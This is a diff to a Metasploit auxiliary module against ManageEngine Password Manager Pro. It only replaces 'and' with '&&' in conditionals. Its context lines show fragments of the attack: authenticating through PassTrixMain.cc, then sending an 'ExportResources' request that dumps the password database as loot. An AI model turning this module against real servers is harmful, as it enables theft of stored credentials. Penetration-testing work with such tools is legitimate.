@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc')
     })
 
-    if res and res.code == 200
+    if res && res.code == 200
       # 2nd step: we try to get the ORGN_NAME and AUTHRULE_NAME from the page (which is only needed for the MSP versions)
       if res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
         orgn_name = $1
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
           'userName' => username
         }
       })
-      if res and res.code == 200
+      if res && res.code == 200
         domain_name = res.body.to_s.strip
       else
         domain_name = nil
@@ -107,14 +107,14 @@ class Metasploit3 < Msf::Auxiliary
         'cookie' => cookie,
         'vars_post' => vars_post
       })
-      if res and res.code == 302
+      if res && res.code == 302
         res = send_request_cgi({
           'method' => 'GET',
           'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc'),
           'cookie' => cookie,
         })
 
-        if res and res.code == 200
+        if res && res.code == 200
           # 5th step: get the c ookies sent in the last response
           return res.get_cookies
         end
@@ -259,7 +259,7 @@ class Metasploit3 < Msf::Auxiliary
           'RequestType' => 'ExportResources'
         }
       })
-      if res and res.code == 200 and res.body.to_s.length > 0
+      if res && res.code == 200 && res.body.to_s.length > 0
         vprint_line(res.body.to_s)
         print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
         loot_name     = 'manageengine.passwordmanagerpro.password.db'
